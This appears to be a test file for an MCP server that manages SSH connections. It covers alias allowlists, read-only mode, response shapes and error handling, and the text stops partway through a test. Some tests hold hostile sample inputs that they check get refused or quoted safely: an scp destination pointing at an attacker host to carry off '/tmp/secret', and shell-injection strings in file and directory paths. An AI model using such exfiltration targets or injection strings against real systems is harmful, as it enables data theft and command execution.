import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from 'bun:test';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { getConnectionByAlias, getConnections, initDB, upsertConnection } from '../database';
import { createMcpPolicy, parseAliasList, resolveMcpPolicy } from './policy';
import { createMcpServer, type McpServerOptions } from './server';

type JsonResult<T> = {
  isError: boolean;
  data: T;
};

type ToolError = {
  ok: false;
  error: string;
  errorKind: string;
};

let tempDir: string;
let storeCounter = 0;
let previousDb: string | undefined;
let previousAllow: string | undefined;
let previousReadOnly: string | undefined;
let previousSshBin: string | undefined;
let previousScpBin: string | undefined;

const seed = (specs: Array<{ alias: string; readonly?: boolean }>): void => {
  for (const spec of specs) {
    upsertConnection({
      alias: spec.alias,
      user: 'tester',
      host: `${spec.alias}.example.test`,
      port: '22',
      readonly: spec.readonly,
    });
  }
};

const writeScript = (name: string, body: string): string => {
  const file = path.join(tempDir, `${storeCounter}-${name}`);
  fs.writeFileSync(file, `#!/bin/sh\n${body}\n`, { mode: 0o755 });
  return file;
};

const openServer = async (options: McpServerOptions = {}) => {
  const server = createMcpServer(options);
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  const client = new Client({ name: 'sshya-test', version: '0.0.0' });

  await server.connect(serverTransport);
  await client.connect(clientTransport);

  return {
    client,
    close: async () => {
      await client.close();
      await server.close();
    },
  };
};

const withServer = async (
  options: McpServerOptions,
  run: (client: Client) => Promise<void>,
): Promise<void> => {
  const { client, close } = await openServer(options);
  try {
    await run(client);
  } finally {
    await close();
  }
};

const callJson = async <T = Record<string, unknown>>(
  client: Client,
  name: string,
  args: Record<string, unknown> = {},
): Promise<JsonResult<T>> => {
  const result = await client.callTool({ name, arguments: args });
  const content = (result.content ?? []) as Array<{ type: string; text?: string }>;
  const text = content.find(entry => entry.type === 'text')?.text;
  if (text === undefined) {
    throw new Error(`Tool ${name} returned no text content`);
  }
  return {
    isError: result.isError === true,
    data: JSON.parse(text) as T,
  };
};

const readTextResource = async (client: Client, uri: string): Promise<string> => {
  const result = await client.readResource({ uri });
  const first = result.contents[0] as { text?: string } | undefined;
  if (!first?.text) {
    throw new Error(`Resource ${uri} returned no text`);
  }
  return first.text;
};

const toolNames = async (client: Client): Promise<string[]> =>
  (await client.listTools()).tools.map(tool => tool.name).sort();

beforeAll(() => {
  tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sshya-mcp-test-'));
});

afterAll(() => {
  fs.rmSync(tempDir, { recursive: true, force: true });
});

beforeEach(() => {
  previousDb = process.env.SSHYA_DB;
  previousAllow = process.env.SSHYA_MCP_ALLOW;
  previousReadOnly = process.env.SSHYA_MCP_READ_ONLY;
  previousSshBin = process.env.SSHYA_SSH_BIN;
  previousScpBin = process.env.SSHYA_SCP_BIN;

  process.env.SSHYA_DB = path.join(tempDir, `sshm-${storeCounter}-${Date.now()}.json`);
  delete process.env.SSHYA_MCP_ALLOW;
  delete process.env.SSHYA_MCP_READ_ONLY;
  delete process.env.SSHYA_SSH_BIN;
  delete process.env.SSHYA_SCP_BIN;
  initDB();
});

afterEach(() => {
  storeCounter += 1;
  const restore = (key: string, value: string | undefined) => {
    if (value === undefined) {
      delete process.env[key];
    } else {
      process.env[key] = value;
    }
  };
  restore('SSHYA_DB', previousDb);
  restore('SSHYA_MCP_ALLOW', previousAllow);
  restore('SSHYA_MCP_READ_ONLY', previousReadOnly);
  restore('SSHYA_SSH_BIN', previousSshBin);
  restore('SSHYA_SCP_BIN', previousScpBin);
});

describe('MCP policy helpers', () => {
  test('parses comma-separated aliases and deduplicates', () => {
    expect(parseAliasList(' web, staging , web, ')).toEqual(['web', 'staging']);
    expect(parseAliasList('')).toEqual([]);
    expect(parseAliasList(undefined)).toEqual([]);
  });

  test('matches simple globs without matching unrelated substrings', () => {
    const policy = createMcpPolicy({ aliases: ['web', 'stg-*', 'db?'] });

    expect(policy.isAliasAllowed('web')).toBe(true);
    expect(policy.isAliasAllowed('stg-web')).toBe(true);
    expect(policy.isAliasAllowed('xstg-web')).toBe(false);
    expect(policy.isAliasAllowed('db1')).toBe(true);
    expect(policy.isAliasAllowed('db12')).toBe(false);
    expect(policy.isAliasAllowed('WEB')).toBe(false);
    expect(policy.inlineSummary()).toBe('Allowed aliases: web, stg-*, db?. Read-only: no.');
  });

  test('unrestricted policy allows every alias', () => {
    const policy = resolveMcpPolicy({});
    expect(policy.isAliasAllowed('anything')).toBe(true);
    expect(policy.inlineSummary()).toBe('Allowed aliases: all stored aliases. Read-only: no.');
  });

  test('an explicitly empty allowlist denies everything instead of failing open', () => {
    const policy = createMcpPolicy({ aliases: ' , ' });

    expect(policy.hasAliasAllowlist).toBe(true);
    expect(policy.aliasPatterns).toEqual([]);
    expect(policy.isAliasAllowed('web')).toBe(false);
    expect(policy.allowedAliasesLabel()).toBe('none (empty allowlist)');
  });

  test('SSHYA_MCP_ALLOW with no usable patterns denies every alias', () => {
    process.env.SSHYA_MCP_ALLOW = ',';

    const policy = resolveMcpPolicy({});

    expect(policy.hasAliasAllowlist).toBe(true);
    expect(policy.isAliasAllowed('web')).toBe(false);
  });

  test('an empty SSHYA_MCP_ALLOW is treated as unset', () => {
    process.env.SSHYA_MCP_ALLOW = '  ';

    const policy = resolveMcpPolicy({});

    expect(policy.hasAliasAllowlist).toBe(false);
    expect(policy.isAliasAllowed('web')).toBe(true);
  });
});

describe('MCP alias allowlist', () => {
  test('filters list_connections and the connections resource', async () => {
    seed([{ alias: 'web' }, { alias: 'stg-db' }, { alias: 'db' }]);

    await withServer({ aliases: ['web', 'stg-*'] }, async (client) => {
      const list = await callJson<Array<{ alias: string }>>(client, 'list_connections');
      expect(list.isError).toBe(false);
      expect(list.data.map(connection => connection.alias)).toEqual(['web', 'stg-db']);

      const resource = JSON.parse(await readTextResource(client, 'sshya://connections')) as Array<{ alias: string }>;
      expect(resource.map(connection => connection.alias)).toEqual(['web', 'stg-db']);

      const allowed = await callJson(client, 'get_connection', { alias: 'stg-db' });
      expect(allowed.isError).toBe(false);

      const denied = await callJson<ToolError>(client, 'get_connection', { alias: 'db' });
      expect(denied.isError).toBe(true);
      expect(denied.data.ok).toBe(false);
      expect(denied.data.errorKind).toBe('alias_not_allowed');
    });
  });

  test('reads the allowlist from SSHYA_MCP_ALLOW when options are omitted', async () => {
    process.env.SSHYA_MCP_ALLOW = 'stg-*';
    seed([{ alias: 'web' }, { alias: 'stg-web' }]);

    await withServer({}, async (client) => {
      const list = await callJson<Array<{ alias: string }>>(client, 'list_connections');
      expect(list.data.map(connection => connection.alias)).toEqual(['stg-web']);

      const denied = await callJson<ToolError>(client, 'print_ssh_command', { alias: 'web' });
      expect(denied.isError).toBe(true);
      expect(denied.data.errorKind).toBe('alias_not_allowed');

      const guide = await readTextResource(client, 'sshya://guide');
      expect(guide).toContain('Allowed aliases: stg-*.');
      expect(client.getInstructions()).toContain('Allowed aliases: stg-*.');
    });
  });

  test('refuses every alias-targeting tool before touching the host', async () => {
    seed([{ alias: 'web' }, { alias: 'db' }]);

    await withServer({ aliases: ['web'] }, async (client) => {
      const calls: Array<[string, Record<string, unknown>]> = [
        ['get_connection', { alias: 'db' }],
        ['test_connection', { alias: 'db' }],
        ['run_command', { alias: 'db', command: 'uptime' }],
        ['run_on_many', { aliases: ['web', 'db'], command: 'uptime' }],
        ['write_remote_file', { alias: 'db', path: '/tmp/file', content: 'x' }],
        ['copy_file', { alias: 'db', source: '/tmp/a', destination: '/tmp/b', direction: 'download' }],
        ['print_ssh_command', { alias: 'db' }],
        ['update_connection', { alias: 'db', host: 'changed.example.test' }],
        ['remove_connection', { alias: 'db' }],
        ['add_connection', { alias: 'prod', user: 'u', host: 'prod.example.test' }],
        ['import_connections', {
          connections: [{ alias: 'db', user: 'u', host: 'db.example.test' }],
        }],
      ];

      for (const [name, args] of calls) {
        const result = await callJson<ToolError>(client, name, args);
        expect({ name, isError: result.isError }).toEqual({ name, isError: true });
        expect({ name, errorKind: result.data.errorKind }).toEqual({ name, errorKind: 'alias_not_allowed' });
      }

      const unchanged = getConnectionByAlias('db');
      expect(unchanged?.host).toBe('db.example.test');
      expect(getConnectionByAlias('prod')).toBeUndefined();
    });
  });

  test('allows commands on permitted aliases using a fake ssh', async () => {
    process.env.SSHYA_SSH_BIN = writeScript('ssh-ok.sh', "printf 'hello\\n'");
    seed([{ alias: 'web' }]);

    await withServer({ aliases: ['web'] }, async (client) => {
      const result = await callJson<{ ok: boolean; stdout: string }>(client, 'run_command', {
        alias: 'web',
        command: 'uptime',
        reuse: false,
      });

      expect(result.isError).toBe(false);
      expect(result.data.ok).toBe(true);
      expect(result.data.stdout).toBe('hello\n');
    });
  });

  test('add_connection and import_connections only create allowed aliases', async () => {
    await withServer({ aliases: ['web', 'stg-*'] }, async (client) => {
      const created = await callJson<{ ok: boolean; created: boolean; connection: { alias: string; readonly?: boolean } }>(
        client,
        'add_connection',
        { alias: 'stg-db', user: 'u', host: 'stg-db.example.test', readonly: true },
      );
      expect(created.isError).toBe(false);
      expect(created.data.created).toBe(true);
      expect(created.data.connection.alias).toBe('stg-db');
      expect(created.data.connection.readonly).toBe(true);

      const refusedAdd = await callJson<ToolError>(client, 'add_connection', {
        alias: 'prod',
        user: 'u',
        host: 'prod.example.test',
      });
      expect(refusedAdd.isError).toBe(true);
      expect(refusedAdd.data.errorKind).toBe('alias_not_allowed');

      const imported = await callJson<{
        ok: boolean;
        imported: string[];
        refused: Array<{ alias: string; errorKind: string }>;
        errorKind: string;
      }>(client, 'import_connections', {
        connections: [
          { alias: 'stg-two', user: 'u', host: 'stg-two.example.test' },
          { alias: 'prod', user: 'u', host: 'prod.example.test' },
        ],
      });
      expect(imported.isError).toBe(true);
      expect(imported.data.ok).toBe(false);
      expect(imported.data.imported).toEqual(['stg-two']);
      expect(imported.data.errorKind).toBe('alias_not_allowed');
      expect(imported.data.refused[0]?.alias).toBe('prod');
      expect(imported.data.refused[0]?.errorKind).toBe('alias_not_allowed');
      expect(getConnectionByAlias('prod')).toBeUndefined();
      expect(getConnections().map(connection => connection.alias).sort()).toEqual(['stg-db', 'stg-two']);
    });
  });

  test('an allowlist with no usable patterns exposes no aliases', async () => {
    seed([{ alias: 'web' }]);

    await withServer({ aliases: ',' }, async (client) => {
      const list = await callJson<Array<{ alias: string }>>(client, 'list_connections');
      expect(list.data).toEqual([]);

      const denied = await callJson<ToolError>(client, 'get_connection', { alias: 'web' });
      expect(denied.isError).toBe(true);
      expect(denied.data.errorKind).toBe('alias_not_allowed');
    });
  });
});

describe('MCP read-only mode', () => {
  test('registers only non-mutating tools and allows downloads', async () => {
    process.env.SSHYA_SCP_BIN = writeScript('scp-ok.sh', 'exit 0');
    seed([{ alias: 'web' }]);

    await withServer({ readOnly: true }, async (client) => {
      const tools = await toolNames(client);
      for (const hidden of ['add_connection', 'update_connection', 'remove_connection', 'import_connections', 'write_remote_file']) {
        expect(tools).not.toContain(hidden);
      }
      for (const present of ['list_connections', 'get_connection', 'test_connection', 'run_command', 'run_on_many', 'copy_file', 'print_ssh_command']) {
        expect(tools).toContain(present);
      }

      const upload = await callJson<ToolError>(client, 'copy_file', {
        alias: 'web',
        source: '/tmp/local',
        destination: '/tmp/remote',
        direction: 'upload',
      });
      expect(upload.isError).toBe(true);
      expect(upload.data.errorKind).toBe('read_only');

      const download = await callJson<{ ok: boolean }>(client, 'copy_file', {
        alias: 'web',
        source: '/tmp/remote',
        destination: '/tmp/local',
        direction: 'download',
      });
      expect(download.isError).toBe(false);
      expect(download.data.ok).toBe(true);

      const guide = await readTextResource(client, 'sshya://guide');
      expect(guide).toContain('Read-only: yes.');
      expect(guide).toContain('does not sandbox the remote host or the local filesystem');
      expect(client.getInstructions()).toContain('Read-only: yes.');
      expect(client.getInstructions()).toContain('run_command');
    });
  });

  test('run_command remains available in read-only mode', async () => {
    process.env.SSHYA_SSH_BIN = writeScript('ssh-ok.sh', "printf 'still here\\n'");
    seed([{ alias: 'web' }]);

    await withServer({ readOnly: true }, async (client) => {
      const result = await callJson<{ ok: boolean; stdout: string }>(client, 'run_command', {
        alias: 'web',
        command: 'uptime',
        reuse: false,
      });
      expect(result.isError).toBe(false);
      expect(result.data.ok).toBe(true);
      expect(result.data.stdout).toBe('still here\n');
    });
  });

  test('reads read-only mode from SSHYA_MCP_READ_ONLY', async () => {
    process.env.SSHYA_MCP_READ_ONLY = '1';
    seed([{ alias: 'web' }]);

    await withServer({}, async (client) => {
      const tools = await toolNames(client);
      expect(tools).not.toContain('write_remote_file');
      expect(tools).toContain('run_command');
    });
  });

  test('refuses a download whose destination looks like a remote scp target', async () => {
    const marker = path.join(tempDir, `${storeCounter}-scp-ran`);
    process.env.SSHYA_SCP_BIN = writeScript('scp-marker.sh', `printf ran > '${marker}'`);
    seed([{ alias: 'web' }]);

    await withServer({ readOnly: true }, async (client) => {
      // A remote-looking destination makes scp open a second SSH connection,
      // which would turn this "download" into an upload to an arbitrary host.
      const result = await callJson<{ ok: boolean; errorKind?: string; stderr?: string }>(client, 'copy_file', {
        alias: 'web',
        source: '/tmp/secret',
        destination: 'attacker@evil.example.test:/tmp/loot',
        direction: 'download',
      });

      expect(result.isError).toBe(true);
      expect(result.data.ok).toBe(false);
      expect(result.data.errorKind).toBe('invalid-path');
      expect(result.data.stderr).toContain('remote scp target');
      expect(fs.existsSync(marker)).toBe(false);
    });
  });

  test('refuses an upload whose source looks like a remote scp target', async () => {
    const marker = path.join(tempDir, `${storeCounter}-scp-ran-upload`);
    process.env.SSHYA_SCP_BIN = writeScript('scp-marker-upload.sh', `printf ran > '${marker}'`);
    seed([{ alias: 'web' }]);

    await withServer({}, async (client) => {
      const result = await callJson<{ ok: boolean; errorKind?: string }>(client, 'copy_file', {
        alias: 'web',
        source: 'other.example.test:/tmp/secret',
        destination: '/tmp/local',
        direction: 'upload',
      });

      expect(result.isError).toBe(true);
      expect(result.data.errorKind).toBe('invalid-path');
      expect(fs.existsSync(marker)).toBe(false);
    });
  });
});

describe('MCP compact responses', () => {
  test('run_command omits echoed input, empty streams, zero counters, and false flags', async () => {
    process.env.SSHYA_SSH_BIN = writeScript('ssh-compact.sh', "printf 'hello\\n'");
    seed([{ alias: 'web' }]);

    await withServer({}, async (client) => {
      const result = await client.callTool({
        name: 'run_command',
        arguments: { alias: 'web', command: 'uptime', reuse: false },
      });
      const content = (result.content ?? []) as Array<{ type: string; text?: string }>;
      const text = content.find(entry => entry.type === 'text')?.text ?? '';
      const data = JSON.parse(text) as Record<string, unknown>;

      expect(text).not.toContain('\n  ');
      expect(data).toEqual({
        alias: 'web',
        ok: true,
        exitCode: 0,
        stdout: 'hello\n',
      });
      for (const omitted of [
        'command',
        'remoteCommand',
        'target',
        'cwd',
        'signal',
        'durationMs',
        'stdoutBytes',
        'stderrBytes',
        'stdoutLines',
        'stderrLines',
        'stdoutTruncated',
        'stderrTruncated',
        'timedOut',
        'reused',
      ]) {
        expect(data).not.toHaveProperty(omitted);
      }
    });
  });

  test('verbose restores the full run result while staying minified', async () => {
    process.env.SSHYA_SSH_BIN = writeScript('ssh-verbose.sh', "printf 'hello\\n'");
    seed([{ alias: 'web' }]);

    await withServer({}, async (client) => {
      const result = await client.callTool({
        name: 'run_command',
        arguments: { alias: 'web', command: 'uptime', reuse: false, verbose: true },
      });
      const content = (result.content ?? []) as Array<{ type: string; text?: string }>;
      const text = content.find(entry => entry.type === 'text')?.text ?? '';
      const data = JSON.parse(text) as Record<string, unknown>;

      expect(text).not.toContain('\n  ');
      expect(data.command).toBe('uptime');
      expect(data.remoteCommand).toBe('uptime');
      expect(data.target).toBe('tester@web.example.test:22');
      expect(data.stdout).toBe('hello\n');
      expect(data.stdoutBytes).toBe(6);
      expect(data.stdoutLines).toBe(1);
      expect(data.signal).toBeNull();
      expect(data.reused).toBe(false);
    });
  });

  test('byte and line counters appear only for truncated streams', async () => {
    process.env.SSHYA_SSH_BIN = writeScript('ssh-truncate.sh', "printf '0123456789abcdef0123456789abcdef\\n'");
    seed([{ alias: 'web' }]);

    await withServer({}, async (client) => {
      const result = await callJson<Record<string, unknown>>(client, 'run_command', {
        alias: 'web',
        command: 'cat big',
        reuse: false,
        maxOutputBytes: 8,
      });

      expect(result.data.stdoutTruncated).toBe(true);
      expect(result.data.stdoutBytes).toBe(33);
      expect(result.data.stdoutLines).toBe(1);
      expect(result.data).not.toHaveProperty('stderrBytes');
      expect(result.data).not.toHaveProperty('stderrLines');
    });
  });

  test('write_remote_file success keeps only actionable fields', async () => {
    process.env.SSHYA_SSH_BIN = writeScript('ssh-write-ok.sh', 'cat > /dev/null');
    seed([{ alias: 'web' }]);

    await withServer({}, async (client) => {
      const result = await callJson<Record<string, unknown>>(client, 'write_remote_file', {
        alias: 'web',
        path: '/srv/app/config.yml',
        content: 'port: 8080\n',
      });

      expect(result.data.ok).toBe(true);
      expect(result.data.alias).toBe('web');
      expect(result.data.path).toBe('/srv/app/config.yml');
      expect(result.data.bytesWritten).toBe(11);
      expect(result.data).not.toHaveProperty('encoding');
      expect(result.data).not.toHaveProperty('appended');
      expect(result.data).not.toHaveProperty('durationMs');
    });
  });
});

describe('MCP lean connection listings', () => {
  test('list_connections and the resource return alias, target, and non-empty fields, newest first', async () => {
    upsertConnection({ alias: 'old', user: 'tester', host: 'old.example.test', port: '22' });
    upsertConnection({
      alias: 'new',
      user: 'tester',
      host: 'new.example.test',
      port: '2222',
      key_path: '/home/tester/.ssh/id_ed25519',
      remote_path: '/srv/app',
      readonly: true,
    });

    // lastUsed is not exposed; inject distinct values behind the MCP boundary.
    const dbPath = process.env.SSHYA_DB!;
    const stored = JSON.parse(fs.readFileSync(dbPath, 'utf8')) as Array<Record<string, unknown>>;
    for (const connection of stored) {
      connection.lastUsed = connection.alias === 'new' ? 2000 : 1000;
    }
    fs.writeFileSync(dbPath, JSON.stringify(stored));

    await withServer({}, async (client) => {
      const list = await callJson<Array<Record<string, unknown>>>(client, 'list_connections');
      expect(list.data).toEqual([
        {
          alias: 'new',
          target: 'tester@new.example.test:2222',
          keyPath: '/home/tester/.ssh/id_ed25519',
          remotePath: '/srv/app',
          readonly: true,
        },
        {
          alias: 'old',
          target: 'tester@old.example.test:22',
        },
      ]);

      const resource = JSON.parse(await readTextResource(client, 'sshya://connections'));
      expect(resource).toEqual(list.data);

      const detail = await callJson<Record<string, unknown>>(client, 'get_connection', { alias: 'new' });
      expect(detail.data.sshCommand).toContain('ssh ');
      expect(detail.data.lastUsed).toBe(2000);
    });
  });
});

describe('MCP run_on_many filters', () => {
  const manyScript = (): string => writeScript('ssh-many.sh', [
    'target=""',
    'for a in "$@"; do case "$a" in *@*) target="$a" ;; esac; done',
    'host="${target#*@}"',
    'host="${host%%:*}"',
    'case "$host" in',
    "  ok1*) printf '0 ERROR 1\\n' ;;",
    "  ok2*) printf '0\\n' ;;",
    "  bad*) printf 'boom ERROR 7\\n'; exit 1 ;;",
    "  *) printf 'unknown\\n'; exit 2 ;;",
    'esac',
    '',
  ].join('\n'));

  test('only=failures returns failed hosts but keeps the full summary', async () => {
    process.env.SSHYA_SSH_BIN = manyScript();
    seed([{ alias: 'ok1' }, { alias: 'ok2' }, { alias: 'bad' }]);

    await withServer({}, async (client) => {
      const result = await callJson<{
        ok: boolean;
        summary: { total: number; succeeded: number; failed: number };
        results: Array<{ alias: string; ok: boolean; stdout?: string }>;
      }>(client, 'run_on_many', {
        aliases: ['ok1', 'ok2', 'bad'],
        command: 'check',
        concurrency: 1,
        only: 'failures',
      });

      expect(result.isError).toBe(true);
      expect(result.data.summary).toEqual({ total: 3, succeeded: 2, failed: 1 });
      expect(result.data.results.map(row => row.alias)).toEqual(['bad']);
      expect(result.data.results[0]?.ok).toBe(false);
      expect(result.data.results[0]?.stdout).toBe('boom ERROR 7\n');
    });
  });

  test('match returns only hosts with matching stdout lines and only those lines', async () => {
    process.env.SSHYA_SSH_BIN = manyScript();
    seed([{ alias: 'ok1' }, { alias: 'ok2' }, { alias: 'bad' }]);

    await withServer({}, async (client) => {
      const result = await callJson<{
        summary: { total: number; succeeded: number; failed: number };
        results: Array<{ alias: string; stdout?: string; ok: boolean }>;
      }>(client, 'run_on_many', {
        aliases: ['ok1', 'ok2', 'bad'],
        command: 'check',
        concurrency: 1,
        match: 'ERROR',
      });

      expect(result.data.summary).toEqual({ total: 3, succeeded: 2, failed: 1 });
      expect(result.data.results.map(row => row.alias)).toEqual(['ok1', 'bad']);
      expect(result.data.results[0]?.stdout).toBe('0 ERROR 1');
      expect(result.data.results[1]?.stdout).toBe('boom ERROR 7');
    });
  });

  test('match and only=failures compose; invalid regex is an actionable error', async () => {
    process.env.SSHYA_SSH_BIN = manyScript();
    seed([{ alias: 'ok1' }, { alias: 'bad' }]);

    await withServer({}, async (client) => {
      const failures = await callJson<{ results: Array<{ alias: string }> }>(client, 'run_on_many', {
        aliases: ['ok1', 'bad'],
        command: 'check',
        concurrency: 1,
        only: 'failures',
        match: 'ERROR',
      });
      expect(failures.data.results.map(row => row.alias)).toEqual(['bad']);

      const invalid = await callJson<ToolError>(client, 'run_on_many', {
        aliases: ['ok1'],
        command: 'check',
        match: '(',
      });
      expect(invalid.isError).toBe(true);
      expect(invalid.data.errorKind).toBe('invalid_arguments');
    });
  });

  test('stdin, tty, and reuse reach every host', async () => {
    const argvLog = path.join(tempDir, `${storeCounter}-many-argv.log`);
    process.env.SSHYA_TEST_ARGV_LOG = argvLog;
    process.env.SSHYA_SSH_BIN = writeScript('ssh-echo-stdin.sh', [
      'printf \'%s\\n\' "$*" >> "$SSHYA_TEST_ARGV_LOG"',
      'data=$(cat)',
      'printf \'%s\' "$data"',
      '',
    ].join('\n'));
    seed([{ alias: 'one' }, { alias: 'two' }]);

    try {
      await withServer({}, async (client) => {
        const result = await callJson<{ results: Array<{ stdout?: string }> }>(client, 'run_on_many', {
          aliases: ['one', 'two'],
          command: 'cat',
          concurrency: 2,
          stdin: 'payload-from-test',
          tty: true,
          reuse: false,
        });

        expect(result.data.results.map(row => row.stdout)).toEqual(['payload-from-test', 'payload-from-test']);
      });

      const invocations = fs.readFileSync(argvLog, 'utf8').trim().split('\n');
      expect(invocations).toHaveLength(2);
      for (const line of invocations) {
        expect(line).toContain('-t');
        expect(line).not.toContain('ControlMaster=auto');
      }
    } finally {
      delete process.env.SSHYA_TEST_ARGV_LOG;
    }
  });
});

describe('MCP actionable errors', () => {
  test('an unknown alias returns alias_not_found with fuzzy suggestions and no SSH spawn', async () => {
    const marker = path.join(tempDir, `${storeCounter}-alias-marker`);
    process.env.SSHYA_SSH_BIN = writeScript('ssh-alias-marker.sh', `printf ran > '${marker}'`);
    seed([{ alias: 'web01' }, { alias: 'web02' }, { alias: 'db' }]);

    await withServer({}, async (client) => {
      const missing = await callJson<ToolError & { suggestions?: string[] }>(client, 'run_command', {
        alias: 'webb01',
        command: 'uptime',
      });

      expect(missing.isError).toBe(true);
      expect(missing.data.errorKind).toBe('alias_not_found');
      expect(missing.data.error).toBe('Alias not found: webb01');
      expect(missing.data.suggestions?.length).toBeGreaterThan(0);
      expect(missing.data.suggestions?.length).toBeLessThanOrEqual(3);
      expect(missing.data.suggestions).toContain('web01');
      expect(missing.data.suggestions).not.toContain('db');
      expect(fs.existsSync(marker)).toBe(false);

      const lookup = await callJson<ToolError & { suggestions?: string[] }>(client, 'get_connection', {
        alias: 'webb01',
      });
      expect(lookup.data.errorKind).toBe('alias_not_found');
      expect(lookup.data.suggestions).toContain('web02');

      const many = await callJson<{
        results: Array<{ alias: string; errorKind?: string; suggestions?: string[] }>;
      }>(client, 'run_on_many', {
        aliases: ['web01', 'webb01'],
        command: 'uptime',
        concurrency: 1,
      });
      const missingRow = many.data.results.find(row => row.alias === 'webb01');
      expect(missingRow?.errorKind).toBe('alias_not_found');
      expect(missingRow?.suggestions).toContain('web01');
    });
  });

  test('sudo tty and password failures get stable kinds and MCP-friendly hints', async () => {
    seed([{ alias: 'web' }]);

    process.env.SSHYA_SSH_BIN = writeScript(
      'ssh-sudo-tty.sh',
      "printf 'sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper\\n' >&2; exit 1",
    );

    await withServer({}, async (client) => {
      const tty = await callJson<{ errorKind?: string; hint?: string }>(client, 'run_command', {
        alias: 'web',
        command: 'sudo systemctl restart nginx',
        reuse: false,
      });
      expect(tty.isError).toBe(true);
      expect(tty.data.errorKind).toBe('tty');
      expect(tty.data.hint).toContain('tty: true');
      expect(tty.data.hint).toContain('sudo -n');
    });

    process.env.SSHYA_SSH_BIN = writeScript(
      'ssh-sudo-password.sh',
      "printf 'sudo: a password is required\\n' >&2; exit 1",
    );

    await withServer({}, async (client) => {
      const password = await callJson<{ errorKind?: string; hint?: string }>(client, 'run_command', {
        alias: 'web',
        command: 'sudo systemctl restart nginx',
        reuse: false,
      });
      expect(password.data.errorKind).toBe('sudo_password');
      expect(password.data.hint).toContain('sudo -n');
    });
  });

  test('every failResult carries an errorKind', async () => {
    seed([{ alias: 'web' }, { alias: 'locked', readonly: true }]);

    await withServer({}, async (client) => {
      const cases: Array<[string, Record<string, unknown>]> = [
        ['get_connection', { alias: 'missing' }],
        ['remove_connection', { alias: 'missing' }],
        ['update_connection', { alias: 'missing', host: 'x.example.test' }],
        ['update_connection', { alias: 'web', newAlias: '' }],
        ['write_remote_file', { alias: 'locked', path: '/tmp/x', content: 'x' }],
      ];

      for (const [name, args] of cases) {
        const result = await callJson<ToolError>(client, name, args);
        expect({ name, isError: result.isError }).toEqual({ name, isError: true });
        expect({ name, errorKind: typeof result.data.errorKind }).toEqual({ name, errorKind: 'string' });
      }
    });
  });

  test('tool descriptions and parameter descriptions stay short', async () => {
    await withServer({}, async (client) => {
      const tools = (await client.listTools()).tools;

      for (const tool of tools) {
        expect(tool.description?.length ?? 0).toBeLessThanOrEqual(180);
        const walk = (schema: unknown): void => {
          if (!schema || typeof schema !== 'object') return;
          const node = schema as Record<string, unknown>;
          if (typeof node.description === 'string') {
            expect(node.description.length).toBeLessThanOrEqual(60);
          }
          for (const key of ['properties', 'items', '$defs', 'definitions']) {
            const children = node[key];
            if (children && typeof children === 'object') {
              for (const child of Object.values(children)) walk(child);
            }
          }
          for (const key of ['anyOf', 'oneOf', 'allOf']) {
            const children = node[key];
            if (Array.isArray(children)) children.forEach(walk);
          }
        };
        walk(tool.inputSchema);
      }
    });
  });
});

describe('MCP robustness', () => {
  test('survives a large inline stdin when the remote command exits before reading it', async () => {
    process.env.SSHYA_SSH_BIN = writeScript('ssh-exit-early.sh', "printf 'done\\n'; exit 0");
    seed([{ alias: 'web' }]);

    await withServer({}, async (client) => {
      // Without an stdin error handler the EPIPE from the exited ssh process
      // becomes an uncaught exception and kills the whole MCP server.
      const result = await callJson<{ ok: boolean; stdout: string }>(client, 'run_command', {
        alias: 'web',
        command: 'cat',
        reuse: false,
        stdin: 'x'.repeat(1024 * 1024),
      });

      expect(result.isError).toBe(false);
      expect(result.data.ok).toBe(true);
      expect(result.data.stdout).toBe('done\n');
    });
  });
});

describe('write_remote_file quoting', () => {
  test('quotes remote paths instead of executing shell metacharacters', async () => {
    const marker = path.join(tempDir, `${storeCounter}-pwn`);
    const workDir = path.join(tempDir, `work $(touch ${marker}) dir`);
    fs.mkdirSync(workDir, { recursive: true });

    // Simulate the remote login shell: execute the final ssh argument locally.
    process.env.SSHYA_SSH_BIN = writeScript('ssh-shell.sh', 'for last; do :; done; exec sh -c "$last"');
    upsertConnection({
      alias: 'web',
      user: 'tester',
      host: '127.0.0.1',
      port: '22',
      remote_path: workDir,
    });

    await withServer({}, async (client) => {
      const remotePath = 'out; touch PWNED; echo ';
      const result = await callJson<{ ok: boolean }>(client, 'write_remote_file', {
        alias: 'web',
        path: remotePath,
        content: 'hello',
      });

      expect(result.isError).toBe(false);
      expect(result.data.ok).toBe(true);
      expect(fs.readFileSync(path.join(workDir, remotePath), 'utf8')).toBe('hello');
      expect(fs.existsSync(path.join(workDir, 'PWNED'))).toBe(false);
      expect(fs.existsSync(marker)).toBe(false);
    });
  });
});

describe('readonly connections', () => {
  test('write_remote_file and uploads are refused until readonly is cleared', async () => {
    const marker = path.join(tempDir, `${storeCounter}-readonly-marker`);
    process.env.SSHYA_SSH_BIN = writeScript('ssh-marker.sh', `cat > /dev/null; printf ran > '${marker}'`);
    process.env.SSHYA_SCP_BIN = writeScript('scp-ok.sh', 'exit 0');
    seed([{ alias: 'web', readonly: true }]);

    await withServer({}, async (client) => {
      const write = await callJson<ToolError>(client, 'write_remote_file', {
        alias: 'web',
        path: '/tmp/config',
        content: 'hello',
      });
      expect(write.isError).toBe(true);
      expect(write.data.errorKind).toBe('connection_readonly');
      expect(fs.existsSync(marker)).toBe(false);

      const upload = await callJson<ToolError>(client, 'copy_file', {
        alias: 'web',
        source: '/tmp/local',
        destination: '/tmp/remote',
        direction: 'upload',
      });
      expect(upload.isError).toBe(true);
      expect(upload.data.errorKind).toBe('connection_readonly');

      const download = await callJson<{ ok: boolean }>(client, 'copy_file', {
        alias: 'web',
        source: '/tmp/remote',
        destination: '/tmp/local',
        direction: 'download',
      });
      expect(download.isError).toBe(false);
      expect(download.data.ok).toBe(true);

      const update = await callJson<{ ok: boolean; connection: { readonly?: boolean } }>(client, 'update_connection', {
        alias: 'web',
        readonly: false,
      });
      expect(update.isError).toBe(false);
      expect(update.data.connection.readonly).toBeUndefined();

      const writeAgain = await callJson<{ ok: boolean }>(client, 'write_remote_file', {
        alias: 'web',
        path: '/tmp/config',
        content: 'hello',
      });
      expect(writeAgain.isError).toBe(false);
      expect(writeAgain.data.ok).toBe(true);
